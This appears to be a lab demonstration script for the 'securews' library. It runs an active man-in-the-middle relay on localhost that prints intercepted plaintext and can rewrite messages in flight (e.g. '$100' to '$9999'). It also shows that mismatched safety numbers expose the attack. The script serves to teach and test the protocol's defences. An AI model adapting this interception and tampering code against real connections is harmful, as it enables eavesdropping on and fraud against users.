from __future__ import annotations

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from _demo_util import (
    client_ssl_context,
    ensure_demo_certificate,
    load_or_create_identity,
    server_ssl_context,
)
from securews import connect, serve

REAL_SERVER_URL = "wss://localhost:8765"
LISTEN_HOST, LISTEN_PORT = "127.0.0.1", 8770

_attacker = None
_tamper = False


_TAMPER_RULES = [(b"$100", b"$9999"), (b"hunter2", b"cracked")]


def _apply_tamper(message: bytes) -> bytes:
    altered = message
    for old, new in _TAMPER_RULES:
        altered = altered.replace(old, new)
    return altered


async def _relay(src, dst, label: str, *, tamper: bool) -> None:
    async for message in src:
        print(f"[MITM] {label} PLAINTEXT INTERCEPTED: {message!r}")
        forwarded = _apply_tamper(message) if tamper else message
        if forwarded != message:
            print(f"[MITM] {label} ALTERED -> {forwarded!r}")
        await dst.send(forwarded)


async def handle_victim(victim) -> None:
    print("\n[MITM] a victim connected and finished the Noise handshake with ME")
    print(f"[MITM] safety number victim<->attacker : {victim.safety_number()}")
    try:
        upstream = await connect(
            REAL_SERVER_URL, identity=_attacker, ssl_context=client_ssl_context()
        )
    except Exception as exc:
        print(f"[MITM] cannot reach the real server ({exc!r}); is server.py running?")
        await victim.close()
        return

    print(f"[MITM] safety number attacker<->server : {upstream.safety_number()}")
    print("[MITM] ^ these two safety numbers DIFFER -> a human comparison catches me.\n")

    t1 = asyncio.create_task(_relay(victim, upstream, "victim -> server", tamper=_tamper))
    t2 = asyncio.create_task(_relay(upstream, victim, "server -> victim", tamper=False))
    _, pending = await asyncio.wait({t1, t2}, return_when=asyncio.FIRST_COMPLETED)
    for task in pending:
        task.cancel()
    await upstream.close()
    print("[MITM] session ended\n")


async def main() -> None:
    global _attacker
    ensure_demo_certificate()
    _attacker = load_or_create_identity("examples/mitm/attacker_identity.hex")
    print(f"[MITM] attacker identity fingerprint: {_attacker.fingerprint}")
    if _tamper:
        print(f"[MITM] TAMPERING ENABLED: victim->server rewrites {_TAMPER_RULES}")

    server = await serve(
        handle_victim,
        LISTEN_HOST,
        LISTEN_PORT,
        identity=_attacker,
        ssl_context=server_ssl_context(),
    )
    print(f"[MITM] listening on wss://localhost:{LISTEN_PORT}  ->  forwarding to {REAL_SERVER_URL}")
    print("[MITM] point the victim at wss://localhost:8770 and watch plaintext appear here.")
    await server.wait_closed()


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="active Noise-layer MITM (lab)")
    parser.add_argument(
        "--tamper", action="store_true", help="rewrite victim->server messages in flight"
    )
    _tamper = parser.parse_args().tamper
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[MITM] stopped")
